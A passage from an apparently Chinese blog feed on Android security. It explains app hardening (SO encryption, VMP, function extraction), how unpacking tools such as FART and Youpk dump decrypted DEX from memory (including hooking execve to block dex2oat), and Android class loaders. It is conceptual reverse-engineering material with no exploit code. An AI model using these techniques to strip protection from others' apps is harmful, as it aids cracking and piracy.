Section加密</h4><p>Section加密的主要分两步：</p><ol><li>将需加密的代码放入特定Section，在加密代码被执行前执行解密逻辑。</li><li>编译后的文件，使用工具对特定Section进行加密，即对Section区间的内容加密。</li></ol><p>这种加密方式适用于开发者对自实现的代码进行保护，因为Section信息以及解密代码都需要开发者主动添加和编译，需要源码支持。</p><h4 id="1-4-1-2-UPX以及类UPX的so加固"><a href="#1-4-1-2-UPX以及类UPX的so加固" class="headerlink" title="1.4.1.2 UPX以及类UPX的so加固"></a>1.4.1.2 UPX以及类UPX的so加固</h4><p>开源的SO加固较为常见的是UPX，很多人会根据UPX源码修改一些特征改成自己的版本，避免直接被脱壳。</p><p>UPX加固SO的做法是只加固代码段，数据段和重定位相关的结构都保留在文件中，利用原SO的重定位信息完成SO重定位，通过插入的Init节对代码进行解密，本质上和Section加密类似，只是放大了加密范围，并添加修改Init节的操作。通过命令<code>readelf -d &#123;sopath&#125;</code>，仍可以看到原SO内的数据和原SO一致，但<code>readelf -S &#123;sopath&#125;</code>时，Section已被破坏无法查看。</p><h4 id="1-4-1-3-自实现Linker方式加固"><a href="#1-4-1-3-自实现Linker方式加固" class="headerlink" title="1.4.1.3 自实现Linker方式加固"></a>1.4.1.3 自实现Linker方式加固</h4><p>自实现Linker的方案目前来说是加固的主要手段。因重定位过程完全自己实现，这样既可以加密SO中的代码，也可以加固SO中的数据。由于自实现Linker，SO结构可以完全破坏和自定义，可以防止被dump出完整的SO。加固后SO静态分析只能看到壳的结构，对于原SO的结构完全隐藏。</p><h4 id="1-4-1-4-代码混淆"><a href="#1-4-1-4-代码混淆" class="headerlink" title="1.4.1.4 代码混淆"></a>1.4.1.4 代码混淆</h4><p>有源码的代码混淆一般可通过插入花指令或通过带混淆功能的编译器进行编译，对生成的代码进行混淆。无源码的代码混淆需要借助壳，对原SO的指令进行抽离，然后对抽离的代码做混淆转换。</p><h4 id="1-4-1-5-VMP"><a href="#1-4-1-5-VMP" class="headerlink" title="1.4.1.5 VMP"></a>1.4.1.5 VMP</h4><p>有源码的VMP方案一般都是借助编译器，在IR层对指令进行虚拟化并插入解释器。无源码的SO加固方案目前还未普及，但原理和有源码方案类似，将原指令处理成虚拟数据，并且插入解释器对虚拟数据解释执行。由于VMP对性能损耗大，对移动端来说，性能和兼容性都需要衡量，实用性不及代码混淆。</p><h1 id="2-加壳技术的特征"><a href="#2-加壳技术的特征" class="headerlink" title="2. 加壳技术的特征"></a>2. 加壳技术的特征</h1><p>整体加固：是所有壳的基础，关键在于怎么区分函数抽取、VMP以及Dex2C甚至是多种技术混合的混合型壳。</p><p>函数抽取：获取到保护的DEX后，函数体的内容是无效的，注意这里说的是无效而不是无意义，有的App加壳后函数依然是有意义的，但不是我们想要的。</p><p>VMP：获取到保护的DEX后，函数的属性由Java属性变为Native，典型的有onCreate函数Native化。</p><p>Dex2C：获取到保护的DEX后，和VMP一样，被保护函数的属性由Java属性变为Native，如开源的DCC(Dex-to-C Compiler)。</p><p>混合型壳：多种加固技术混合使用，比如先将原有Smali指令流使用VMP或Dex2C保护，然后再经过函数抽取进一步保护。</p><h1 id="3-编译安卓源码"><a href="#3-编译安卓源码" class="headerlink" title="3. 编译安卓源码"></a>3. 编译安卓源码</h1><p>为什么要编译源码脱壳？</p><ul><li>Frida检测非常难</li><li>root检测非常难</li><li>可以直接使用源码中的函数，大大提高开发效率</li></ul><h1 id="4-沙箱脱壳机的核心原理"><a href="#4-沙箱脱壳机的核心原理" class="headerlink" title="4. 沙箱脱壳机的核心原理"></a>4. 沙箱脱壳机的核心原理</h1><h2 id="4-1-脱壳的本质"><a href="#4-1-脱壳的本质" class="headerlink" title="4.1 脱壳的本质"></a>4.1 脱壳的本质</h2><p>Android App脱壳的本质就是对内存中处于解密状态的DEX的dump。</p><p>首先要区分脱壳与修复。脱壳指的是对加固APK中保护的DEX的整体的dump，不管是函数抽取、Dex2C还是VMP，首先要做的就是对整体DEX的dump，然后再对脱壳下来的DEX进行修复。要达到对APK的脱壳，最为关键的就是准确定位内存中解密后的DEX文件的起始地址和大小。达到对APK的成功脱壳，最为关键的要素是：</p><ul><li>内存中DEX的起始地址和大小。只有拿到这两个要素，才能够成功dump下内存中的DEX。</li><li>脱壳时机。只有正确的脱壳时机，才能够dump下明文状态的DEX。否则即使是正确的起始地址和大小，dump下来的也可能只是密文。</li></ul><h2 id="4-2-关键类流程分析"><a href="#4-2-关键类流程分析" class="headerlink" title="4.2 关键类流程分析"></a>4.2 关键类流程分析</h2><p>脱壳时机可以从下面几个方法分析。脱壳点可以通过插入以下函数找到。</p><h3 id="4-2-1-InMemoryDexClassLoader源码分析"><a href="#4-2-1-InMemoryDexClassLoader源码分析" class="headerlink" title="4.2.1 InMemoryDexClassLoader源码分析"></a>4.2.1 InMemoryDexClassLoader源码分析</h3><ul><li>static object CreateSingleDexFileCookie()</li><li>static const DexFile * CreateDexFile()</li><li>DexFile::Open()</li><li>OpenCommon()</li><li>DexFile::DexFile()</li></ul><h3 id="4-2-2-DexClassLoader加载DEX源码分析"><a href="#4-2-2-DexClassLoader加载DEX源码分析" class="headerlink" title="4.2.2 DexClassLoader加载DEX源码分析"></a>4.2.2 DexClassLoader加载DEX源码分析</h3><ul><li>OpenAndReadMagic()</li><li>DexFile::OpenCommon()</li><li>DexFile::DexFile()</li></ul><h3 id="4-2-3-Dex2oat"><a href="#4-2-3-Dex2oat" class="headerlink" title="4.2.3 Dex2oat"></a>4.2.3 Dex2oat</h3><p>Dex2oat(Dalvik excutable file to optimized art file)是一个对DEX文件进行编译优化的程序，在我们的Android手机中的位置是<code>/system/bin/dex2oat</code>。通过编译优化，可以提升用户日常的使用体验(包含安装速度、启动速度、应用使用过程中的流畅度等)，是Android Art Runtime中的一个重要模块。</p><p>Android虚拟机可以识别的是DEX文件，应用使用过程中如果每次将DEX文件加载进内存，解释性执行字节码，效率会很低，严重影响用户体验。通过Dex2oat优化后，可以在系统运行之前利用合适的时机将DEX文件字节码提前转化为虚拟机可以执行运行的机器码，后续直接从效率更高的机器码中运行，则运行阶段更加流程，优化用户体验。</p><h1 id="5-二代壳对方法体的静态抽取与动态回填"><a href="#5-二代壳对方法体的静态抽取与动态回填" class="headerlink" title="5. 二代壳对方法体的静态抽取与动态回填"></a>5. 二代壳对方法体的静态抽取与动态回填</h1><h2 id="5-1-抽取壳的完整运行流程"><a href="#5-1-抽取壳的完整运行流程" class="headerlink" title="5.1 抽取壳的完整运行流程"></a>5.1 抽取壳的完整运行流程</h2><ol><li>解析DEX文件，保存所有方法的指令结构信息</li><li>通过方法所属的类名和方法签名信息，获取其对应的指令结构信息</li><li>获取方法指令的个数和指令的开始位置，然后将其指令全部置空</li><li>重新计算文件的checksum和SHA值，回写到DEX的文件头部</li><li>将抽空的DEX文件，放到手机指定目录下，然后进行加载运行</li><li>在Native层hook <code>libdvm.so</code>中的<code>dexFindClass()</code>函数</li><li>在Java层使用DexClassLoader加载DEX并且反射运行被抽空的类的方法</li><li>通过DexFile结构体一次获取被抽空的方法对应的指令内存地址</li><li>修改内存为可读写属性，还原指令到内存块中</li></ol><h2 id="5-2-手动进行函数抽取"><a href="#5-2-手动进行函数抽取" class="headerlink" title="5.2 手动进行函数抽取"></a>5.2 手动进行函数抽取</h2><p>写一个简单的APK程序，Make Project。</p><img src="/posts/18047266/5.2.1.png" class="" title="写一个简单的函数"><p>在<code>C:\Users\v5le0n9\AndroidStudioProjects\MyApplication\app\build\outputs\apk\debug</code>生成的APK程序解压。将解压出来的DEX文件载入jadx中查看函数信息，可以看到我们刚才编写的<code>testFunc()</code>中的内容。</p><img src="/posts/18047266/5.2.2.png" class="" title="jadx查看dex文件"><p>将该DEX文件载入010 Editor，使用DEX模板打开。壳进行函数抽取时，是将DEX文件中的method_ids与class_defs中的内容全部置空。</p><img src="/posts/18047266/5.2.3.jpg" class="" title="010查看dex文件"><p>为了减少工作量，我们只将<code>testFunc()</code>函数置空。</p><img src="/posts/18047266/5.2.4.png" class="" title="将函数置空"><img src="/posts/18047266/5.2.5.png" class="" title="将函数置空"><p>更新完后载入jadx发现出错，DEX文件中的checksum值不对：</p><img src="/posts/18047266/5.2.6.png" class="" title="出错"><p>所以还要在010 Editor中修改该DEX文件dex header中的checksum值。错误提示我们原本文件的checksum为0xd89949be，修改过后的checksum经过计算为0x01dc48ab，所以应将修改过的DEX文件的checksum值改为0x01dc48ab，注意小端存储。</p><img src="/posts/18047266/5.2.7.png" class="" title="修改checksum"><p>此时再次打开就没有错误警告了。可以看到<code>testFunc()</code>函数已经被抽空了。</p><img src="/posts/18047266/5.2.8.png" class="" title="函数抽空"><h2 id="5-3-动态回填"><a href="#5-3-动态回填" class="headerlink" title="5.3 动态回填"></a>5.3 动态回填</h2><h3 id="5-3-1-类加载时机"><a href="#5-3-1-类加载时机" class="headerlink" title="5.3.1 类加载时机"></a>5.3.1 类加载时机</h3><p>类加载有两种加载形式：</p><ul><li>隐式加载：<ul><li>创建类的实例</li><li>访问类的静态变量，或者为静态变量赋值</li><li>调用类的静态方法</li><li>使用反射方式来强制创建某个类或接口对应的java.lang.Class对象</li><li>初始化某个类的子类</li></ul></li><li>显示加载：两者又有所区别<ul><li>使用<code>LoadClass()</code>加载</li><li>使用<code>forName()</code>加载</li><li>通过源码分析Android类加载的流程</li></ul></li></ul><h3 id="5-3-2-类装载流程"><a href="#5-3-2-类装载流程" class="headerlink" title="5.3.2 类装载流程"></a>5.3.2 类装载流程</h3><ol><li>装载：查找和导入class文件</li><li>链接：其中解析步骤可选<ul><li>检查：检查载入的class文件数据的正确性</li><li>准备：给类的静态变量分配存储空间</li><li>解析：将符号引用转成直接引用</li></ul></li><li>初始化：调用<clinit>函数，对静态变量、静态代码块执行初始化工作</li></ol><p>进行动态回填必须要使用进程内Hook技术。</p><h2 id="5-4-实现函数抽取壳的前置技术"><a href="#5-4-实现函数抽取壳的前置技术" class="headerlink" title="5.4 实现函数抽取壳的前置技术"></a>5.4 实现函数抽取壳的前置技术</h2><p>如果dex2oat对抽取的DEX进行了编译生成了OAT文件，那么动态修改的DEX中的Smali指令流就不会生效。所以art下的抽取型壳首先就是要禁用dex2oat。</p><p>如何禁用dex2oat：</p><ul><li>Hook关键函数，使其不进入dex2oat流程</li><li>直接使用InMemoryDexClassLoader</li></ul><p>如果不禁用dex2oat，那么函数体必须在进入dex2oat流程前恢复好，才可以在dex2oat流程之中进行脱壳，脱下完整的函数体恢复之后的DEX。</p><p>GenerateOatFileNoChecks -&gt; Dex2Oat -&gt; Exec -&gt; exec_utils.cc -&gt; Exec -&gt; ExecAndReturnCode -&gt; execve。</p><p>使用Native hook，hook住execve，使其不运行dex2oat进程。</p><h1 id="6-更强抽取壳的dump"><a href="#6-更强抽取壳的dump" class="headerlink" title="6. 更强抽取壳的dump"></a>6. 更强抽取壳的dump</h1><h2 id="6-1-Fart整体dump思路的演进"><a href="#6-1-Fart整体dump思路的演进" class="headerlink" title="6.1 Fart整体dump思路的演进"></a>6.1 Fart整体dump思路的演进</h2><h3 id="6-1-1-v1-0：ClassLoader中dump"><a href="#6-1-1-v1-0：ClassLoader中dump" class="headerlink" title="6.1.1 v1.0：ClassLoader中dump"></a>6.1.1 v1.0：ClassLoader中dump</h3><ul><li>时机：App中的Applocation类中的<code>attachBaseContext()</code>和<code>onCreate()</code>函数是App中最先执行的方法，因此需要选在Application的<code>onCreate()</code>函数执行之后才开始被调用的任意一个函数中。比如选择在ActivityThread中的<code>performLaunchActivity()</code>函数作为时机，来获取最终的应用的ClassLoader。</li><li>方式：hook -&gt; 反射和dump。获取到应用解密后的DEX文件最终依附的ClassLoader之后通过Java的反射机制最终获取到对应的DexFile的结构体，并完成DEX的dump。</li></ul><h3 id="6-1-2-v2-0：更多“海量”的脱壳点"><a href="#6-1-2-v2-0：更多“海量”的脱壳点" class="headerlink" title="6.1.2 v2.0：更多“海量”的脱壳点"></a>6.1.2 v2.0：更多“海量”的脱壳点</h3><ul><li>时机：所有类和方法的装载和链接/编译和执行流程之中。</li><li>方式：基于hook -&gt; dump。ART下DexFile类中定义了两个关键的变量：begin_、size_以及用于获取这两个变量的<code>Begin()</code>和<code>Size()</code>函数。这两个变量分别代表着当前DexFile对象对应的内存中的DEX文件加载的起始位置和大小。只要有了这两个值，我们就可以完成对这个DEX的dump。</li></ul><h3 id="6-1-3-v3-0：优中选优后的脱壳点"><a href="#6-1-3-v3-0：优中选优后的脱壳点" class="headerlink" title="6.1.3 v3.0：优中选优后的脱壳点"></a>6.1.3 v3.0：优中选优后的脱壳点</h3><ul><li>时机：找到绕过dex2oat的时机，类的初始化函数始终运行在ART下的interpreter模式。</li><li>方式：在解释执行<clinit>时进行脱壳，实现“绕过”dex2oat，因此必然进入到<code>interpreter.cc</code>文件中的<code>Execute()</code>函数，进而进入ART下的解释器解释执行。</li></ul><h3 id="6-1-4-v4-0：优中选优-双保险"><a href="#6-1-4-v4-0：优中选优-双保险" class="headerlink" title="6.1.4 v4.0：优中选优+双保险"></a>6.1.4 v4.0：优中选优+双保险</h3><ul><li>时机和方式：同时在dex2oat和类的初始化流程函数设置hook。</li></ul><h2 id="6-2-Youpk的整体dump思路"><a href="#6-2-Youpk的整体dump思路" class="headerlink" title="6.2 Youpk的整体dump思路"></a>6.2 Youpk的整体dump思路</h2><h3 id="6-2-1-v4-0：优中选优-双保险"><a href="#6-2-1-v4-0：优中选优-双保险" class="headerlink" title="6.2.1 v4.0：优中选优+双保险"></a>6.2.1 v4.0：优中选优+双保险</h3><ul><li>时机：App启动后10s开始。</li><li>方式：禁用dex2oat，在dex2oat中设置CompilerFilter为仅验证compiler_options_ -&gt; SetCompilerFilter()，从ClassLinker中遍历DexFile对象并dump。</li></ul><h2 id="6-3-Youpk-Fart整体dump进一步提升"><a href="#6-3-Youpk-Fart整体dump进一步提升" class="headerlink" title="6.3 Youpk+Fart整体dump进一步提升"></a>6.3 Youpk+Fart整体dump进一步提升</h2><h3 id="6-3-1-每个脱壳点都可以脱壳DexFile"><a href="#6-3-1-每个脱壳点都可以脱壳DexFile" class="headerlink" title="6.3.1 每个脱壳点都可以脱壳DexFile"></a>6.3.1 每个脱壳点都可以脱壳DexFile</h3><ul><li>时机和方式：在安卓8上禁用dex2oat，结合Fart所提出的海量脱壳点，每个脱壳点都可以脱壳。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;从前面的笔记我们已经知道Frida如何安装并可以用来进行Native层注入，Frida其实还有一个很强大的功能，就是脱壳。这篇文章就来认识一下Android的壳与记录一下Frida脱壳的基本步骤。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>类加载器与动态加载</title>
    <link href="http://example.com/posts/f504c8a5.html"/>
    <id>http://example.com/posts/f504c8a5.html</id>
    <published>2022-08-10T09:49:13.553Z</published>
    <updated>2022-11-17T06:25:50.124Z</updated>
    
    <content type="html"><![CDATA[<p>类加载器与动态加载是学习Android加壳与脱壳的需要。</p><span id="more"></span><p>Java程序的编译执行过程：</p><img src="/posts/f504c8a5/1.2.1.png" class="" title="Java编译执行过程"><h1 id="1-类加载器"><a href="#1-类加载器" class="headerlink" title="1. 类加载器"></a>1. 类加载器</h1><p>类加载器遵循双亲委派模式。</p><p>JVM的类加载器包括3种：</p><ul><li>Bootstrap ClassLoader(引导类加载器)：C/C++代码实现的加载器，用于加载指定的JDK核心类库，比如java.lang、java.uti等这些系统类。Java虚拟机的启动就是通过Bootstrap，该ClassLoader在Java里无法获取，负责加载/lib下的类。</li><li>Extensions ClassLoader(拓展类加载器)：Java中的实现类为ExtClassLoader，提供了除了系统类之外的额外功能，可以在Java里获取，负责加载/lib/ext下的类。</li><li>Application ClassLoader(应用程序类加载器)：Java中的实现类为AppClassLoader，是与我们接触最多的类加载器，开发人员写的代码默认就是由它来加载，ClassLoader.getSystemClassLoader返回的就是它。</li></ul><p>也可以自定义类加载器，只需要通过继承java.lang.ClassLoader类的方式来实现自己的类加载器即可。</p><img src="/posts/f504c8a5/1.1.3.png" class="" title="Java类加载器"><p>在Android中与ClassLoader相关的类加载器共有8个：</p><ul><li>ClassLoader：抽象类。</li><li>BootClassLoader：预加载常用类，单例模式。与Java中的Bootstrap ClassLoader不同，它并不是由C/C++实现，而是由Java实现的。</li><li>BaseDexClassLoader：是PathClassLoader、DexClassLoader、InMemoryDexClassLoader的父类，类加载的主要逻辑都是在BaseDexClassLoader完成的。</li><li>SecurityClassLoader：继承了抽象类ClassLoader，拓展了ClassLoader类加入了权限方面的功能，加强了安全性。</li><li>URLClassLoader：SecurityClassLoader子类，用URL路径从JAR文件中加载类和资源。</li><li>PathClassLoader：Android默认使用的类加载器，一个APK中的Activity等类便是在其中加载。</li><li>DexClassLoader：可以加载任意目录下的DEX/JAR/APK/ZIP文件，比PathClassLoader更灵活，是实现插件化、热修复以及DEX加壳的重点。</li><li>InMemoryDexClassLoader：Android 8.0新引入，用于直接从内存中加载DEX。</li></ul><img src="/posts/f504c8a5/1.1.5.png" class="" title="Android类加载器"><h2 id="1-1-双亲委派模式"><a href="#1-1-双亲委派模式" class="headerlink" title="1.1 双亲委派模式"></a>1.1 双亲委派模式</h2><h3 id="1-1-1-双亲委派模式定义"><a href="#1-1-1-双亲委派模式定义" class="headerlink" title="1.1.1 双亲委派模式定义"></a>1.1.1 双亲委派模式定义</h3><p>加载<code>.class</code>文件时，以递归的形式逐级向上委托给父加载器ParentClassLoader加载，如果加载过了，就不用再加载一遍；如果父加载器没有加载过，继续委托给父加载器去加载，一直到这条链路的顶级，顶级ClassLoader如果没有加载过，则尝试加载，加载失败，则逐级向下交还调用者加载。</p><img src="/posts/f504c8a5/1.1.1.png" class="" title="双亲委派模式"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">           <span class="comment">//1.先检查是否已经加载过--findLoaded</span></span><br><span class="line">           Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">           <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="comment">//2.如果自己没加载过,存在父类,则委托父类</span></span><br><span class="line">                   <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                       c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       c = findBootstrapClassOrNull(name);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">               &#125;</span><br><span class="line"> </span><br><span class="line">               <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="comment">//3.如果父类也没加载过,则尝试本级classLoader加载</span></span><br><span class="line">                   c = findClass(name);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">          <span class="keyword">return</span> c;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>（1）先检查自己是否已经加载过<code>.class</code>文件，用<code>findLoadedClass()</code>方法，如果已经加载了直接返回<br>（2）如果自己没有加载过，存在父类，则委派父类去加载，用<code>parent.loadClass(name,false)</code>方法，此时会向上传递，然后去父加载器中循环第1步，一直到顶级ClassLoader<br>（3）如果父类没有加载，则尝试本级ClassLoader加载，如果加载失败了就会向下传递，交给调用方式实现<code>.class</code>文件的加载</p><h3 id="1-1-2-双亲委派加载流程"><a href="#1-1-2-双亲委派加载流程" class="headerlink" title="1.1.2 双亲委派加载流程"></a>1.1.2 双亲委派加载流程</h3><p>我们要加载一个<code>.class</code>文件，定义一个CustomerClassLoader类加载器：</p><p>(1)首先会判断自己的CustomerClassLoader是否加载过，如果加载过直接返回；<br>(2)如果没有加载过则会调用父类PathClassLoader去加载，该父类同样会判断自己是否加载过，如果没有加载过则委托给父类BootClassLoader去加载；<br>(3)这个BootClassLoader是顶级ClassLoader，同样会去判断自己有没有加载过，如果也没有加载过则会调用自己的<code>findClass(name)</code>去加载；<br>(4)如果顶级BootClassLoader加载失败了，则会把加载这个动作向下交还给PathClassLoader；<br>(5)这个PathClassLoader也会尝试去调用<code>findClass(name)</code>去加载，如果加载失败了，则会继续向下交还给CustomerClassLoader来完成加载。这整个过程感觉是一个递归的过程，逐渐往上然后又逐渐往下，直到加载成功。</p><img src="/posts/f504c8a5/1.1.2.png" class="" title="双亲委派加载流程"><h3 id="1-1-3-双亲委派的作用"><a href="#1-1-3-双亲委派的作用" class="headerlink" title="1.1.3 双亲委派的作用"></a>1.1.3 双亲委派的作用</h3><p>(1) 防止同一个<code>.class</code>文件重复加载；<br>(2) 对于任意一个类确保在虚拟机中的唯一性，由加载它的类加载器和这个类的全类名一同确立其在Java虚拟机中的唯一性；<br>(3) 保证<code>.class</code>文件不被篡改，通过委派方式可以保证系统类的加载逻辑不被篡改。</p><h2 id="1-2-Android中的类加载机制"><a href="#1-2-Android中的类加载机制" class="headerlink" title="1.2 Android中的类加载机制"></a>1.2 Android中的类加载机制</h2><h3 id="1-2-1-Dalvik虚拟机启动过程"><a href="#1-2-1-Dalvik虚拟机启动过程" class="headerlink" title="1.2.1 Dalvik虚拟机启动过程"></a>1.2.1 Dalvik虚拟机启动过程</h3><img src="/posts/f504c8a5/1.2.2.jpg" class="" title="Dalvik虚拟机启动过程"><p>Dalvik虚拟机的启动过程可以分为8个步骤：</p><h4 id="1-2-1-1-AndroidRuntime-start"><a href="#1-2-1-1-AndroidRuntime-start" class="headerlink" title="1.2.1.1 AndroidRuntime.start()"></a>1.2.1.1 AndroidRuntime.start()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">AndroidRuntime::start</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* className, <span class="type">const</span> <span class="type">bool</span> startSystemServer)</span>&#123;</span><br><span class="line">    ......    </span><br><span class="line">    <span class="comment">/* start the virtual machine */</span>    </span><br><span class="line">    <span class="keyword">if</span> (startVm(&amp;mJavaVM, &amp;env) != <span class="number">0</span>)        </span><br><span class="line">        <span class="keyword">goto</span> bail;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*     * Register android functions.     */</span>    </span><br><span class="line">    <span class="keyword">if</span> (startReg(env) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        LOGE(<span class="string">&quot;Unable to register all android natives\n&quot;</span>);        </span><br><span class="line">        <span class="keyword">goto</span> bail;    </span><br><span class="line">    &#125;    </span><br><span class="line">    ......    </span><br><span class="line">    <span class="comment">/*     * Start VM.  This thread becomes the main thread of the VM, and will     * not return until the VM exits.     */</span>    </span><br><span class="line">    jclass startClass;    </span><br><span class="line">    jmethodID startMeth;    </span><br><span class="line">    slashClassName = strdup(className);   </span><br><span class="line">    <span class="keyword">for</span> (cp = slashClassName; *cp != <span class="string">&#x27;\0&#x27;</span>; cp++)  </span><br><span class="line">        <span class="keyword">if</span> (*cp == <span class="string">&#x27;.&#x27;</span>)         </span><br><span class="line">            *cp = <span class="string">&#x27;/&#x27;</span>;    </span><br><span class="line">    startClass = env-&gt;FindClass(slashClassName);   </span><br><span class="line">    <span class="keyword">if</span> (startClass == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        LOGE(<span class="string">&quot;JavaVM unable to locate class &#x27;%s&#x27;\n&quot;</span>, slashClassName); </span><br><span class="line">        <span class="comment">/* keep going */</span>    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        startMeth = env-&gt;GetStaticMethodID(startClass, <span class="string">&quot;main&quot;</span>, <span class="string">&quot;([Ljava/lang/String;)V&quot;</span>);       </span><br><span class="line">        <span class="keyword">if</span> (startMeth == <span class="literal">NULL</span>) &#123;           </span><br><span class="line">            LOGE(<span class="string">&quot;JavaVM unable to find main() in &#x27;%s&#x27;\n&quot;</span>, className);        </span><br><span class="line">            <span class="comment">/* keep going */</span>       </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;         </span><br><span class="line">            env-&gt;CallStaticVoidMethod(startClass, startMeth, strArray);  </span><br><span class="line">            ...... </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">    LOGD(<span class="string">&quot;Shutting down VM\n&quot;</span>);    </span><br><span class="line">    <span class="keyword">if</span> (mJavaVM-&gt;DetachCurrentThread() != JNI_OK)    </span><br><span class="line">        LOGW(<span class="string">&quot;Warning: unable to detach main thread\n&quot;</span>);   </span><br><span class="line">    <span class="keyword">if</span> (mJavaVM-&gt;DestroyJavaVM() != <span class="number">0</span>)    </span><br><span class="line">        LOGW(<span class="string">&quot;Warning: VM did not shut down cleanly\n&quot;</span>);  </span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数主要做了4件事情：</p><ul><li>调用成员函数<code>startVm()</code>来创建一个Dalvik虚拟机实例，并且保存在成员变量mJavaVm中。</li><li>调用成员函数<code>startReg()</code>来注册一些Android核心类的JNI方法。</li><li>调用参数className所描述的一个Java类的静态成员函数<code>main()</code>，来作为Zygote进程的Java层入口。这个入口类就为com.android.internal.os.ZygoteInit。执行这一步的时候，Zygote进程中的Dalvik虚拟机实例就开始正式运作了。注意，在这一步中，也就是在com.android.internal.os.ZygoteInit类的静态成员函数<code>main()</code>，会进行大量的Android核心类和系统资源文件预加载。</li><li>从com.android.internal.os.ZygoteInit类的静态成员函数<code>main()</code>返回来的时候，就说明Zygote进程准备要退出来了。在退出之前，会调用前面创建的Dalvik虚拟机实例的成员函数<code>DetachCurrentThread()</code>和<code>DestroyJavaVM()</code>。其中，前者用来将Zygote进程的主线程脱离前面创建的Dalvik虚拟机实例，后者是用来销毁前面创建的Dalvik虚拟机实例。</li></ul><h4 id="1-2-1-2-AndroidRuntime-startVm"><a href="#1-2-1-2-AndroidRuntime-startVm" class="headerlink" title="1.2.1.2 AndroidRuntime.startVm()"></a>1.2.1.2 AndroidRuntime.startVm()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">AndroidRuntime::startVm</span><span class="params">(JavaVM** pJavaVM, JNIEnv** pEnv)</span>&#123;  </span><br><span class="line">    <span class="type">int</span> result = <span class="number">-1</span>;   </span><br><span class="line">    JavaVMInitArgs initArgs;  </span><br><span class="line">    JavaVMOption opt;  </span><br><span class="line">    ...... </span><br><span class="line">    property_get(<span 